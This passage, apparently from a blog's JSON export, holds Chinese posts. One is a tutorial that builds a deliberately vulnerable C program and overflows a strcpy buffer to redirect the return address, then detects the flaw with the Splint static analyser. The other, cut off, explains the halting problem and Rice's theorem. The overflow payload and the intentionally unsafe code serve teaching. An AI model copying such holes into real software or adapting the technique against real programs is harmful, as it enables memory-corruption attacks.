函数，这是我们想通过缓冲区溢出攻击来执行的恶意代码。可以注意到，func 里面 buf 的空间是 16，而在主函数中，给出的输入 in，前面的数字正好有 16 个，恰好用完 buf 的空间，后面以 16 进制方式硬编码的输入，就是我们想要通过溢出来覆盖掉 ebp 和返回地址的数据。\\n\\n我们先使用 main 里面的正常版本输入来编译这个程序，看一下堆栈的情况。\\n<br />\\n![](/content/images/2015/07/exp1.png)\\n<br />\\n\\n和前文一样，第四行表明 rsp 是 ded0，dee0 那行数据就是输入 in 存储的字符，可以和 ASCII 码表对照来看。def0 行的前两个数据是 ebp，第三个数据就是返回地址，和倒数第一行的栈帧数据相符。\\n\\n然后，更改前文源码变成溢出版本，将正常版本注释掉，编译并反汇编，查看 exploit 的函数地址。\\n<br />\\n![](/content/images/2015/07/exp3.png)\\n<br />\\n可以看到，exploit 的调用地址是 40057d，这个数字已经填写在前文源码中 in 的最后几个字节上了， in 的作用就是让 buf 溢出，然后让这几个字节恰好覆盖在堆栈里返回地址的位置上。\\n\\n用 gdb 看一下带漏洞的这个程序，结果是：\\n<br />\\n![](/content/images/2015/07/exp4.png)\\n<br />\\n不难发现，倒数第九行 def0 行就是正常的缓冲区数据，df00 行的前两个数据是 ebp，然而 ebp 已经被我用溢出的方法非法改掉，对照前文的正常版本可以看出，第二个数据应该是 0x00007fff，我在输入 in 里面，改成了 0xcccc7fff。\\n\\n当然，最重要的是，第三个数据***返回地址***，已经被溢出为 40057d，变成了 exploit 的调用地址，而并非原来的主函数返回地址，同时可以看到，由于非法把返回地址改写，最后几行 gdb 探测栈帧出现了异常，已经无法显示正常的栈帧。\\n\\n最后，执行这个带有溢出攻击的程序，结果是：\\n<br />\\n![](/content/images/2015/07/exp5.png)\\n<br />\\n\\n在源码中，并没有调用 exploit 的语句，然而我们却通过利用缓冲区溢出漏洞，让这个函数执行了。\\n\\n##使用 Splint 分析漏洞程序\\n\\n带漏洞的程序已经编出来了，最后，用静态分析工具 Splint 来分析一下它。假定我们完全不知道 exploit 这个程序的情况，就是别人给我的，那么，cd 到程序目录：\\n\\n    splint +bounds exploit.c\\n\\n分析结果是：\\n<br />\\n![](/content/images/2015/07/exp6.png)\\n<br />\\n\\n它分析出 3 条警告，第一条说 exploit 函数里面没写 return 语句，第二条就是我们需要的，它展示出 strcpy 是不安全的，可能会出现 buffer 越界的隐患。（就是带有缓冲区溢出漏洞）\\n\\n这就是用静态工具分析出漏洞的一个简单例子。但它究竟是用什么技术分析出来的，那我就说不清了。\\n\\n文章所展示的层次，就是实验层次的***会用***，这工具的背后，就是各种语法分析，语义分析等等，那些学术原理。那些原理用来指导编写出这个工具。\\n\\n---\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Splint 是一个比较常用的静态分析工具，缓冲区溢出漏洞，或者说缓冲区溢出攻击，也是信息安全领域的基础知识，本文以此对用静态分析工具进行漏洞检测做一个最基本的例子。</p>\n<h2 id=\"splint\">Splint</h2>\n<p><a href=\"http://www.splint.org/\">Splint</a> 是一个开源的静态代码检测工具,用于检查 C 语言程序安全弱点和编码错误。从官网下载源码：<a href=\"http://www.splint.org/downloads/splint-3.1.2.src.tgz\">http://www.splint.org/downloads/splint-3.1.2.src.tgz</a></p>\n<pre><code>tar xvzf splint-3.1.2.src.tgz\ncd splint-3.1.2\n./configure\nmake\nsudo make install\n</code></pre>\n<p>然后，即可在终端使用。</p>\n<h2 id=\"\">缓冲区溢出基础</h2>\n<p>缓冲区溢出是经典的安全漏洞，想理解它的话，需要对程序运行时系统堆栈的运行原理有基本的了解。简单地讲，一个程序能实现函数调用，主要是依赖堆栈的存在。学过计算机原理的都应该知道，计算机执行程序的方法就是 CPU 从内存中一条一条地取出指令，然后执行。而究竟去什么地方取指令，取决于 <code>EIP</code> 寄存器，<code>EIP</code> 里面记录了下一条指令的存放地址，如果想实现函数调用，或者说实现一个跳转，那么需要修改 <code>EIP</code> 的值，问题在于，函数执行完了之后怎么回到原来的调用处继续往下执行呢？这个过程必然需要堆栈帮忙，保存跳转前的各种状态，方便函数执行完毕后，返回主程序时，把上下文恢复成原来的情况。</p>\n<p>程序中的每个函数都有自己的栈帧，关于栈帧不多解释了，可以参考《Linux C 程序设计大全》或者网络博客等等任何有关栈帧和内存管理的文章。</p>\n<p>考虑下面一段程序：</p>\n<pre><code>\nint seeding (int a, int b)\n{\n    char buf[32];\n    return 0;\n}\nint main()\n{\n    ret = seeding(2, 5);\n    return 0;\n}\n</code></pre>\n<p>在主函数中调用了一个 <code>seeding</code> 函数，那么主函数里面的逻辑如果用汇编来表示，大体上就是：</p>\n<pre><code>\npush 5\npush 2\npush addr_of_return\ncall seeding\n</code></pre>\n<p>而在 <code>seeding</code> 里面，则会 <code>push ebp</code>, <code>mov esp, ebp</code>，保护现场，进入自己的栈帧，等函数执行完毕，会把 <code>ebp</code> 恢复，之后根据 <code>addr_of_return</code> 的值修改 <code>EIP</code>，返回到主函数中。</p>\n<p>画图不太方便， 借用网络的一张图进行示意，函数调用过程堆栈的情况大体是这样。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/huanchong.jpg\" alt=\"\"><br>\n<br /></p>\n<p>不用管右边，只看左边。压栈是从上往下压的，<code>data</code>上边的区域可以认为是主函数使用的，<code>data</code> 可以认为是存放了 a 和 b 两个参数，即 5 和 2，返回地址存放了主函数里面 <code>return</code> 语句的指令地址， <code>ebp</code> 存放了主函数的 <code>ebp</code>（<code>ebp</code> <code>esp</code>是什么意思这里不解释，只说重点）。缓冲区就是<code>buf[32]</code>，因为局部变量也是存放在栈里面的，所以如果往<code>buf</code>里面赋值的话，内容就存放在图上的缓冲区中。</p>\n<p>正常情况下，<code>seeding</code>函数返回的时候，会把图上的<code>ebp</code>值出栈，这样寄存器<code>ebp</code>就恢复到了<code>seeding</code>调用前的状态，之后把返回地址放到<code>EIP</code>中，这样，下一条指令自然就会执行主函数的 <code>return 0</code>语句，那么函数调用就成功结束，返回到了主函数中。</p>\n<p>下面问题来了，C 语言是不检查数组边界的，会根据你的输入一直往后面写，所以如果你往<code>buf[32]</code>里面存了 48 个字符，超过了数组的容量，那么由于缓冲区上面的空间是<code>ebp</code>和返回地址，所以超出的部分会覆盖掉这些地方原来的值。特别的，如果精心设计超出部分的值，让我们设计好的数字恰好覆盖掉返回地址，那么程序返回的时候，就不是返回到原来的主函数，而是跳转到我们想要执行的恶意代码了。</p>\n<p>这就是缓冲区溢出漏洞，也可以说是缓冲区溢出攻击，由于一般的做法是通过故意让缓冲区溢出，来打开一个 shell，所以这段用于溢出原缓冲区的代码又称为 shellcode。</p>\n<h2 id=\"\">构造带有缓冲区溢出漏洞的程序</h2>\n<p>为了做实验，我们写一个带溢出漏洞的程序。顺便将上面的原理在实践中演示一下。</p>\n<p>首先是一个正常的程序，我们展示一下程序中调用栈的情况。源代码是:</p>\n<pre><code>\n// filename: overflow.c\n#include &ltstdio.h&gt\n#include &ltstring.h&gt\n\nint func(char in[])\n{\n\tchar buf[10];\n\n\tstrcpy(buf, in);\n\treturn 0;\n}\n\nint main()\n{\n\tchar *in = \"myinput\";\n\tint ret;\n\n\tret = func(in);\n\n\treturn 0;\n}\n</code></pre>\n<p>编译这段程序，注意要加上禁止堆栈保护选项：</p>\n<pre><code>gcc -g -fno-stack-protector overflow.c -o overflow\n</code></pre>\n<p>编译后，使用 gdb 在 <code>func</code>里面的<code>return</code> 处下断点，观察内存、<code>esp</code>以及栈帧情况。结果如图所示。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/over1.png\" alt=\"\"><br>\n<br /><br>\n<br /><br>\n<img src=\"/content/images/2015/07/over2.png\" alt=\"\"><br>\n<br /></p>\n<ul>\n<li>由于是 64 位系统，所以寄存器都是 rbp，rsp，实际就是上文的 ebp，esp。</li>\n<li>由于是 64 位系统，所以地址有点长。</li>\n<li>这里只关注第二张图，后文都说的是第二张图。</li>\n</ul>\n<p>可以看到，倒数第四行，rsp（堆栈栈顶） 指向了 dee0。在正数第三行开始，我们查看了 dee0 开始到 df10 的内存数据，对照 <a href=\"http://ascii.911cha.com/\">ASCII</a> 码表可以看到，堆栈最上面的元素（def0 那行）就是程序里面的 <code>myinput</code>，紧接着就是 ebp（df00 那行的前两个数据），而 df00 行的第三个数据 0x0040056f，就是返回地址，与图片倒数第一行给出的栈帧情况相符，倒数第一行表明，函数结束后，应该返回 main 的 40056f 处，和堆栈中写入的数据是一致的。所以实验结果与上节原理的解释是相符的，堆栈里面先是缓冲区，缓冲区上面是 ebp，再上面是返回地址。</p>\n<p>下面我们改动程序，让缓冲区溢出，覆盖掉返回地址。改动后的程序是这样：</p>\n<pre><code>\n// filename: exploit.c\n#include &ltstdio.h&gt\n#include &ltstring.h&gt\n\nint exploit()\n{\n\tprintf(\"我是幼苗我自豪\\n\");\n}\n\nint func(char in[])\n{\n\tchar buf[16];\n\n\tstrcpy(buf, in);\n\treturn 0;\n}\n\nint main()\n{\n\tchar *in = \"1234567890123456\\x20\\xdf\\xff\\xff\\xff\\x7f\\xcc\\xcc\\x7d\\x05\\x40\\x00\";\n\t// char *in = \"123456789012345\"; 正常版本\n\tint ret;\n\n\tret = func(in);\n\treturn 0;\n}\n</code></pre>\n<p>首先，程序里面多了一个 exploit 函数，这是我们想通过缓冲区溢出攻击来执行的恶意代码。可以注意到，func 里面 buf 的空间是 16，而在主函数中，给出的输入 in，前面的数字正好有 16 个，恰好用完 buf 的空间，后面以 16 进制方式硬编码的输入，就是我们想要通过溢出来覆盖掉 ebp 和返回地址的数据。</p>\n<p>我们先使用 main 里面的正常版本输入来编译这个程序，看一下堆栈的情况。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/exp1.png\" alt=\"\"><br>\n<br /></p>\n<p>和前文一样，第四行表明 rsp 是 ded0，dee0 那行数据就是输入 in 存储的字符，可以和 ASCII 码表对照来看。def0 行的前两个数据是 ebp，第三个数据就是返回地址，和倒数第一行的栈帧数据相符。</p>\n<p>然后，更改前文源码变成溢出版本，将正常版本注释掉，编译并反汇编，查看 exploit 的函数地址。<br>\n<br /><br>\n<img src=\"/content/images/2015/07/exp3.png\" alt=\"\"><br>\n<br /><br>\n可以看到，exploit 的调用地址是 40057d，这个数字已经填写在前文源码中 in 的最后几个字节上了， in 的作用就是让 buf 溢出，然后让这几个字节恰好覆盖在堆栈里返回地址的位置上。</p>\n<p>用 gdb 看一下带漏洞的这个程序，结果是：<br>\n<br /><br>\n<img src=\"/content/images/2015/07/exp4.png\" alt=\"\"><br>\n<br /><br>\n不难发现，倒数第九行 def0 行就是正常的缓冲区数据，df00 行的前两个数据是 ebp，然而 ebp 已经被我用溢出的方法非法改掉，对照前文的正常版本可以看出，第二个数据应该是 0x00007fff，我在输入 in 里面，改成了 0xcccc7fff。</p>\n<p>当然，最重要的是，第三个数据***返回地址***，已经被溢出为 40057d，变成了 exploit 的调用地址，而并非原来的主函数返回地址，同时可以看到，由于非法把返回地址改写，最后几行 gdb 探测栈帧出现了异常，已经无法显示正常的栈帧。</p>\n<p>最后，执行这个带有溢出攻击的程序，结果是：<br>\n<br /><br>\n<img src=\"/content/images/2015/07/exp5.png\" alt=\"\"><br>\n<br /></p>\n<p>在源码中，并没有调用 exploit 的语句，然而我们却通过利用缓冲区溢出漏洞，让这个函数执行了。</p>\n<h2 id=\"splint\">使用 Splint 分析漏洞程序</h2>\n<p>带漏洞的程序已经编出来了，最后，用静态分析工具 Splint 来分析一下它。假定我们完全不知道 exploit 这个程序的情况，就是别人给我的，那么，cd 到程序目录：</p>\n<pre><code>splint +bounds exploit.c\n</code></pre>\n<p>分析结果是：<br>\n<br /><br>\n<img src=\"/content/images/2015/07/exp6.png\" alt=\"\"><br>\n<br /></p>\n<p>它分析出 3 条警告，第一条说 exploit 函数里面没写 return 语句，第二条就是我们需要的，它展示出 strcpy 是不安全的，可能会出现 buffer 越界的隐患。（就是带有缓冲区溢出漏洞）</p>\n<p>这就是用静态工具分析出漏洞的一个简单例子。但它究竟是用什么技术分析出来的，那我就说不清了。</p>\n<p>文章所展示的层次，就是实验层次的***会用***，这工具的背后，就是各种语法分析，语义分析等等，那些学术原理。那些原理用来指导编写出这个工具。</p>\n<hr>\n</div>","amp":"15","plaintext":"Splint\n是一个比较常用的静态分析工具，缓冲区溢出漏洞，或者说缓冲区溢出攻击，也是信息安全领域的基础知识，本文以此对用静态分析工具进行漏洞检测做一个最基本的例子。\n\nSplint\nSplint [http://www.splint.org/]  是一个开源的静态代码检测工具,用于检查 C 语言程序安全弱点和编码错误。从官网下载源码：\nhttp://www.splint.org/downloads/splint-3.1.2.src.tgz\n\ntar xvzf splint-3.1.2.src.tgz\ncd splint-3.1.2\n./configure\nmake\nsudo make install\n\n\n然后，即可在终端使用。\n\n缓冲区溢出基础\n缓冲区溢出是经典的安全漏洞，想理解它的话，需要对程序运行时系统堆栈的运行原理有基本的了解。简单地讲，一个程序能实现函数调用，主要是依赖堆栈的存在。学过计算机原理的都应该知道，计算机执行程序的方法就是\nCPU 从内存中一条一条地取出指令，然后执行。而究竟去什么地方取指令，取决于 EIP  寄存器，EIP \n里面记录了下一条指令的存放地址，如果想实现函数调用，或者说实现一个跳转，那么需要修改 EIP \n的值，问题在于，函数执行完了之后怎么回到原来的调用处继续往下执行呢？这个过程必然需要堆栈帮忙，保存跳转前的各种状态，方便函数执行完毕后，返回主程序时，把上下文恢复成原来的情况。\n\n程序中的每个函数都有自己的栈帧，关于栈帧不多解释了，可以参考《Linux C 程序设计大全》或者网络博客等等任何有关栈帧和内存管理的文章。\n\n考虑下面一段程序：\n\n\nint seeding (int a, int b)\n{\n    char buf[32];\n    return 0;\n}\nint main()\n{\n    ret = seeding(2, 5);\n    return 0;\n}\n\n\n在主函数中调用了一个 seeding  函数，那么主函数里面的逻辑如果用汇编来表示，大体上就是：\n\n\npush 5\npush 2\npush addr_of_return\ncall seeding\n\n\n而在 seeding  里面，则会 push ebp, mov esp, ebp，保护现场，进入自己的栈帧，等函数执行完毕，会把 ebp  恢复，之后根据 \naddr_of_return  的值修改 EIP，返回到主函数中。\n\n画图不太方便， 借用网络的一张图进行示意，函数调用过程堆栈的情况大体是这样。\n\n\n\n\n\n\n不用管右边，只看左边。压栈是从上往下压的，data上边的区域可以认为是主函数使用的，data  可以认为是存放了 a 和 b 两个参数，即 5 和\n2，返回地址存放了主函数里面 return  语句的指令地址， ebp  存放了主函数的 ebp（ebp  esp是什么意思这里不解释，只说重点）。缓冲区就是\nbuf[32]，因为局部变量也是存放在栈里面的，所以如果往buf里面赋值的话，内容就存放在图上的缓冲区中。\n\n正常情况下，seeding函数返回的时候，会把图上的ebp值出栈，这样寄存器ebp就恢复到了seeding调用前的状态，之后把返回地址放到EIP\n中，这样，下一条指令自然就会执行主函数的 return 0语句，那么函数调用就成功结束，返回到了主函数中。\n\n下面问题来了，C 语言是不检查数组边界的，会根据你的输入一直往后面写，所以如果你往buf[32]里面存了 48\n个字符，超过了数组的容量，那么由于缓冲区上面的空间是ebp\n和返回地址，所以超出的部分会覆盖掉这些地方原来的值。特别的，如果精心设计超出部分的值，让我们设计好的数字恰好覆盖掉返回地址，那么程序返回的时候，就不是返回到原来的主函数，而是跳转到我们想要执行的恶意代码了。\n\n这就是缓冲区溢出漏洞，也可以说是缓冲区溢出攻击，由于一般的做法是通过故意让缓冲区溢出，来打开一个 shell，所以这段用于溢出原缓冲区的代码又称为\nshellcode。\n\n构造带有缓冲区溢出漏洞的程序\n为了做实验，我们写一个带溢出漏洞的程序。顺便将上面的原理在实践中演示一下。\n\n首先是一个正常的程序，我们展示一下程序中调用栈的情况。源代码是:\n\n\n// filename: overflow.c\n#include <stdio.h>\n#include <string.h>\n\nint func(char in[])\n{\n\tchar buf[10];\n\n\tstrcpy(buf, in);\n\treturn 0;\n}\n\nint main()\n{\n\tchar *in = \"myinput\";\n\tint ret;\n\n\tret = func(in);\n\n\treturn 0;\n}\n\n\n编译这段程序，注意要加上禁止堆栈保护选项：\n\ngcc -g -fno-stack-protector overflow.c -o overflow\n\n\n编译后，使用 gdb 在 func里面的return  处下断点，观察内存、esp以及栈帧情况。结果如图所示。\n\n\n\n\n\n\n\n\n\n\n\n * 由于是 64 位系统，所以寄存器都是 rbp，rsp，实际就是上文的 ebp，esp。\n * 由于是 64 位系统，所以地址有点长。\n * 这里只关注第二张图，后文都说的是第二张图。\n\n可以看到，倒数第四行，rsp（堆栈栈顶） 指向了 dee0。在正数第三行开始，我们查看了 dee0 开始到 df10 的内存数据，对照 ASCII\n[http://ascii.911cha.com/]  码表可以看到，堆栈最上面的元素（def0 那行）就是程序里面的 myinput，紧接着就是\nebp（df00 那行的前两个数据），而 df00 行的第三个数据\n0x0040056f，就是返回地址，与图片倒数第一行给出的栈帧情况相符，倒数第一行表明，函数结束后，应该返回 main 的 40056f\n处，和堆栈中写入的数据是一致的。所以实验结果与上节原理的解释是相符的，堆栈里面先是缓冲区，缓冲区上面是 ebp，再上面是返回地址。\n\n下面我们改动程序，让缓冲区溢出，覆盖掉返回地址。改动后的程序是这样：\n\n\n// filename: exploit.c\n#include <stdio.h>\n#include <string.h>\n\nint exploit()\n{\n\tprintf(\"我是幼苗我自豪\\n\");\n}\n\nint func(char in[])\n{\n\tchar buf[16];\n\n\tstrcpy(buf, in);\n\treturn 0;\n}\n\nint main()\n{\n\tchar *in = \"1234567890123456\\x20\\xdf\\xff\\xff\\xff\\x7f\\xcc\\xcc\\x7d\\x05\\x40\\x00\";\n\t// char *in = \"123456789012345\"; 正常版本\n\tint ret;\n\n\tret = func(in);\n\treturn 0;\n}\n\n\n首先，程序里面多了一个 exploit 函数，这是我们想通过缓冲区溢出攻击来执行的恶意代码。可以注意到，func 里面 buf 的空间是\n16，而在主函数中，给出的输入 in，前面的数字正好有 16 个，恰好用完 buf 的空间，后面以 16 进制方式硬编码的输入，就是我们想要通过溢出来覆盖掉\nebp 和返回地址的数据。\n\n我们先使用 main 里面的正常版本输入来编译这个程序，看一下堆栈的情况。\n\n\n\n\n\n\n和前文一样，第四行表明 rsp 是 ded0，dee0 那行数据就是输入 in 存储的字符，可以和 ASCII 码表对照来看。def0 行的前两个数据是\nebp，第三个数据就是返回地址，和倒数第一行的栈帧数据相符。\n\n然后，更改前文源码变成溢出版本，将正常版本注释掉，编译并反汇编，查看 exploit 的函数地址。\n\n\n\n\n\n可以看到，exploit 的调用地址是 40057d，这个数字已经填写在前文源码中 in 的最后几个字节上了， in 的作用就是让 buf\n溢出，然后让这几个字节恰好覆盖在堆栈里返回地址的位置上。\n\n用 gdb 看一下带漏洞的这个程序，结果是：\n\n\n\n\n\n不难发现，倒数第九行 def0 行就是正常的缓冲区数据，df00 行的前两个数据是 ebp，然而 ebp\n已经被我用溢出的方法非法改掉，对照前文的正常版本可以看出，第二个数据应该是 0x00007fff，我在输入 in 里面，改成了 0xcccc7fff。\n\n当然，最重要的是，第三个数据***返回地址***，已经被溢出为 40057d，变成了 exploit\n的调用地址，而并非原来的主函数返回地址，同时可以看到，由于非法把返回地址改写，最后几行 gdb 探测栈帧出现了异常，已经无法显示正常的栈帧。\n\n最后，执行这个带有溢出攻击的程序，结果是：\n\n\n\n\n\n\n在源码中，并没有调用 exploit 的语句，然而我们却通过利用缓冲区溢出漏洞，让这个函数执行了。\n\n使用 Splint 分析漏洞程序\n带漏洞的程序已经编出来了，最后，用静态分析工具 Splint 来分析一下它。假定我们完全不知道 exploit 这个程序的情况，就是别人给我的，那么，cd\n到程序目录：\n\nsplint +bounds exploit.c\n\n\n分析结果是：\n\n\n\n\n\n\n它分析出 3 条警告，第一条说 exploit 函数里面没写 return 语句，第二条就是我们需要的，它展示出 strcpy 是不安全的，可能会出现\nbuffer 越界的隐患。（就是带有缓冲区溢出漏洞）\n\n这就是用静态工具分析出漏洞的一个简单例子。但它究竟是用什么技术分析出来的，那我就说不清了。\n\n文章所展示的层次，就是实验层次的***会用***，这工具的背后，就是各种语法分析，语义分析等等，那些学术原理。那些原理用来指导编写出这个工具。\n\n\n--------------------------------------------------------------------------------","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2015-07-15T08:26:08.000Z","created_by":"1","updated_at":"2015-07-16T00:39:04.000Z","updated_by":"1","published_at":"2015-07-15T12:09:50.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null},{"id":"59bccd6bf9a5a920fc140c44","uuid":"e6359926-f2b6-4a1f-a947-3dbc845bdbf0","title":"图灵停机问题和 Rice 定理","slug":"rice","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"这么哲学的问题，不知道该从哪里扯起啊。\\n\\n##图灵停机\\n\\n假设我是一个”内裤收集狂魔“，咳...不是，是”程序收集狂魔“，喜欢收集各式各样的程序，于是，每天世界各地的程序员都给我发来他们写的各种奇葩程序。我作为一个收藏家，起码要判断一下他们发来的程序是否可以在特定的输入下正常结束退出，要知道，有很多学渣写的程序会不明不白地陷入死循环，无响应之类的，这种程序我就没必要收藏了。\\n\\n但是，每天收到的程序太多了，根本不可能一个一个手工去试它们能不能正常结束。我作为学神，当然希望写一个判断程序，来帮助我去自动测试这些程序，把不能正常结束的程序都挑出来。那么问题来了，我能不能写出这样的程序呢？\\n\\n图灵告诉我说，不能。图灵停机问题描述的是：***是否存在一个程序，它能够计算任何程序在给定输入下是否会运行结束。***\\n\\n假设我文曲星附身，灵光大闪，真的写出这样一个程序，那么就先假设有这样一个函数，名字是 `CheckHalt(program, input)`，那么程序写出来大致就是这样。\\n\\n<pre><code>\\nbool CheckHalt(program, input) \\n{ \\n　　 if(program halts on input) \\n　　     return true; \\n　　 else \\n　　     return false; \\n} \\n</code></pre>\\n\\n逻辑一目了然，就是如果被检测的程序在给定的输入下停机了，就返回真，表明可以停机，否则，就返回假，表明不能停机。此时，再构造一个自己给自己找病的函数 Check，参数是一个程序：\\n\\n<pre><code>\\nvoid Check(program)\\n{\\n    if(CheckHalt(program, program))\\n        while(1);\\n    else\\n        return;\\n}\\n</code></pre>\\n这个时候，来考虑一下`Check(Check)` 是否会停机（就是正常退出），就是说自己调用自己的情况。\\n\\n* 如果`Check(Check)`可以停机，那么一定走的是 `else` 分支，那么`if(CheckHalt(program, program))`应该判断为假。也就是说，`CheckHalt(program, program)`返回的是 false，即程序不可以停机，与假设能停机是矛盾的。\\n* 如果`Check(Check)`不可以停机，也就是说，它陷入了 `while(1);`的死循环，则`if(CheckHalt(program, program))`返回的是 true，即程序可以停机，与假设又是矛盾的。\\n\\n所以，灵光大闪是瞎闪，文曲星也没附身，这样的程序根本不存在。\\n\\n像给你一个输入 x，你写个函数，给我计算以 x 为半径的圆的面积，这种能用编程语言写出来并且运行的，都是***可计算函数***。考虑的更一般化一些，函数就像个黑盒一样，你给它喂一个输入，它就会吐一个输出。那么在 Windows 系统上运行的可执行程序，某种角度看也是函数，你运行任何程序，都是你给它一个指令（输入），它做出预设好的反应（输出），比如你点右上角的红叉，那窗口会关闭。处理同一类问题有相同的算法，这样的函数是可计算函数。\\n\\n另外就是，如果一个程序 P 的效果和一个函数关系 f 的效果一样，那么就说 P 可以计算 f，f 是确定的，然而 P 却可以有 N 多个。比如给出半径求圆面积，这个计算公式，也就是函数关系 f(x) = Pi * r * r 是死的，是确定的。但是全班每个人写出的程序可能都不一样，有的人会多用几个中间变量，有的人会多输出几个字使程序更加友好等等。\\n\\n以上是可计算函数，而像图灵停机问题这种，就是***不可计算函数***，或者说是***不可判定的***。不可计算函数也有很多，比如，***不存在一个程序，它能够判断任意两个程序是否能计算同样的 f***。\\n\\n##Rice 定理\\n世界上函数这么多，怎么才能判断某个函数是不是可计算呢。Rice 定理可以帮到我们。Rice 定理说的是：***有一个函数集合 S （就是说 S 是函数关系 f 的集合），并且 S 不是空集，也不是全部函数 f，那么程序 P 是否属于 S 是不可计算的***。\\n\\n这到底啥意思？\\n\\n比如计算圆面积的公式是一个函数，那么假定集合 S 就包含这一个元素，显然 S 不是空集也不是全部函数，那么如果我想写一个自动判作业程序，自动判断学生交上来的作业程序 P 是否正确计算了这个圆面积，这样的判作业程序是不存在的。\\n\\n这可能和现实的感觉不一样，你会感觉好像有这样的程序，其实不是，现实中的确可以写出来，但写出来的程序会有误判，因为这是一个不可计算问题，现实的解决方案只能做到近似。现实生活中有非常多的具有判别功能的程序，存在着误报和漏报，因为它们解决的都是不可计算问题，这些程序做的，只是权衡误报率和漏报率，根据需要给出一个较优解。\\n\\n\\n##回到静态分析\\n静态分析的文章，引用 Rice 定理，无非是想说明，完全准确的静态分析程序是不存在的，或者说普适的静态分析算法，静态分析工具是不存在的。\\n\\n* 世界上不存在一个程序，可以检测任何程序 P 是否具有某个安全漏洞。\\n* 世界上不存在一个程序，可以检测任何程序 P 是否进入了某个 if 分支。\\n* 世界上不存在一个程序，可以检测任何程序 P 是否...\\n\\n所以文章中 (《基于静态分析的安全漏洞检测技术研究》) 会说：***由于程序的任何非平凡性质都是不可判定的，所以静态分析算法只能给出源程序某些性质的不完全或不精确的解。***\\n\\n上一篇文章， Splint 给出分析结果时用的动词都是 may （去看看图片，是不是 may），最后它分析的对不对，还是需要人来判断的。 \\n<br />\\n![](/content/images/2015/07/xuexi.gif)\\n<br />\\n\\n---\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>这么哲学的问题，不知道该从哪里扯起啊。</p>\n<h2 id=\"\">图灵停机</h2>\n<p>假设我是一个”内裤收集狂魔“，咳...不是，是”程序收集狂魔“，喜欢收集各式各样的程序，于是，每天世界各地的程序员都给我发来他们写的各种奇葩程序。我作为一个收藏家，起码要判断一下他们发来的程序是否可以在特定的输入下正常结束退出，要知道，有很多学渣写的程序会不明不白地陷入死循环，无响应之类的，这种程序我就没必要收藏了。</p>\n<p>但是，每天收到的程序太多了，根本不可能一个一个手工去试它们能不能正常结束。我作为学神，当然希望写一个判断程序，来帮助我去自动测试这些程序，把不能正常结束的程序都挑出来。那么问题来了，我能不能写出这样的程序呢？</p>\n<p>图灵告诉我说，不能。图灵停机问题描述的是：<strong><em>是否存在一个程序，它能够计算任何程序在给定输入下是否会运行结束。</em></strong></p>\n<p>假设我文曲星附身，灵光大闪，真的写出这样一个程序，那么就先假设有这样一个函数，名字是 <code>CheckHalt(program, input)</code>，那么程序写出来大致就是这样。</p>\n<pre><code>\nbool CheckHalt(program, input) \n{ \n　　 if(program halts on input) \n　　     return true; \n　　 else \n　　     return false; \n} \n</code></pre>\n<p>逻辑一目了然，就是如果被检测的程序在给定的输入下停机了，就返回真，表明可以停机，否则，就返回假，表明不能停机。此时，再构造一个自己给自己找病的函数 Check，参数是一个程序：</p>\n<pre><code>\nvoid Check(program)\n{\n    if(CheckHalt(program, program))\n        while(1);\n    else\n        return;\n}\n</code></pre>\n<p>这个时候，来考虑一下<code>Check(Check)</code> 是否会停机（就是正常退出），就是说自己调用自己的情况。</p>\n<ul>\n<li>如果<code>Check(Check)</code>可以停机，那么一定走的是 <code>else</code> 分支，那么<code>if(CheckHalt(program, program))</code>应该判断为假。也就是说，<code>CheckHalt(program, program)</code>返回的是 false，即程序不可以停机，与假设能停机是矛盾的。</li>\n<li>如果<code>Check(Check)</code>不可以停机，也就是说，它陷入了 <code>while(1);</code>的死循环，则<code>if(CheckHalt(program, program))</code>返回的是 true，即程序可以停机，与假设又是矛盾的。</li>\n</ul>\n<p>所以，灵光大闪是瞎闪，文曲星也没附身，这样的程序根本不存在。</p>\n<p>像给你一个输入 x，你写个函数，给我计算以 x 为半径的圆的面积，这种能用编程语言写出来并且运行的，都是***可计算函数***。考虑的更一般化一些，函数就像个黑盒一样，你给它喂一个输入，它就会吐一个输出。那么在 Windows 系统上运行的可执行程序，某种角度看也是函数，你运行任何程序，都是你给它一个指令（输入），它做出预设好的反应（输出），比如你点右上角的红叉，那窗口会关闭。处理同一类问题有相同的算法，这样的函数是可计算函数。</p>\n<p>另外就是，如果一个程序 P 的效果和一个函数关系 f 的效果一样，那么就说 P 可以计算 f，f 是确定的，然而 P 却可以有 N 多个。比如给出半径求圆面积，这个计算公式，也就是函数关系 f(x) = Pi * r * r 是死的，是确定的。但是全班每个人写出的程序可能都不一样，有的人会多用几个中间变量，有的人会多输出几个字使程序更加友好等等。</p>\n<p>以上是可计算函数，而像图灵停机问题这种，就是***不可计算函数***，或者说是***不可判定的***。不可计算函数也有很多，比如，<strong><em>不存在一个程序，它能够判断任意两个程序是否能计算同样的 f</em></strong>。</p>\n<h2 id=\"rice\">Rice 定理</h2>\n<p>世界上函数这么多，怎么才能判断某个函数是不是可计算呢。Rice 定理可以帮到我们。Rice 定理说的是：<strong><em>有一个函数集合 S （就是说 S 是函数关系 f 的集合），并且 S 不是空集，也不是全部函数 f，那么程序 P 是否属于 S 是不可计算的</em></strong>。</p>\n<p>这到底啥意思？</p>\n<p>比如计算圆面积的公式是一个函数，那么假定集合 S 就包含这一个元素，显然 S 不是空集也不是全部函数，那么如果我想写一个自动判作业程序，自动判断学生交上来的作业程序 P 是否正确计算了这个圆面积，这样的判作业程序是不存在的。</p>\n<p>这可能和现实的感觉不一样，你会感觉好像有这样的程序，其实不是，现实中的确可以写出来，但写出来的程序会有误判，因为这是一个不可计算问题，现实的解决方案只能做到近似。现实生活中有非常多的具有判别功能的程序，存在着误报和漏报，因为它们解决的都是不可计算问题，这些程序做的，只是权衡误报率和漏报率，根据需要给出一个较优解。</p>\n<h2 id=\"\">回到静态分析</h2>\n<p>静态分析的文章，引用 Rice 